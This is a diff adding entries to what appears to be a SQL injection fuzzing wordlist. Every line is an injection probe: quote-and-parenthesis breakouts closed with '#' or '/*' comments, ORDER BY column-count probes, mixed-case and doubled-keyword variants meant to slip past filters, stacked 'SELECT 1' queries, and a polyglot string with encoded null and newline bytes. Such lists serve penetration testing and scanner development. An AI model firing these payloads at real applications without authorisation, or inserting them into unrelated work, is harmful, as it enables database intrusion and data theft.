@@ -4,16 +4,42 @@
 #
 /*
 ;
+1 #
 1 /*
+1) #
 1) /*
+' #
+" #
 ' /*
 " /*
+') #
+") #
 ') /*
 ") /*
+')) #
+")) #
 ')) /*
 ")) /*
+) #
 ) /*
+)) #
 )) /*
+' orDeR by 1 #
+' ordeR by 1337 #
+" orDeR by 1 #
+" ordeR by 1337 #
+') orDeR by 1 #
+') ordeR by 1337 #
+") orDeR by 1 #
+") ordeR by 1337 #
+' orORDeRdeR by 1 #
+' orORDeRdeR by 1337 #
+" orORDeRdeR by 1 #
+" orORDeRdeR by 1337 #
+') orORDeRdeR by 1 #
+') orORDeRdeR by 1337 #
+") orORDeRdeR by 1 #
+") orORDeRdeR by 1337 #
 '
 "
 `
@@ -55,6 +81,12 @@
 ')+orORDeRdeR+by+1337+#
 ")+orORDeRdeR+by+1+#
 ")+orORDeRdeR+by+1337+#
+'; SeleCT 1 #
+"; SeleCT 1 #
+'); SeleCT 1 #
+"); SeleCT 1 #
+')); SeleCT 1 #
+")); SeleCT 1 #
 '; SeleCT 1 /*
 "; SeleCT 1 /*
 '); SeleCT 1 /*
@@ -73,3 +105,4 @@
 ");+SeleCT+1+/*
 '));+SeleCT+1+/*
 "));+SeleCT+1+/*
+abraca+dabra'"`)}];/*--+-#%00%0A
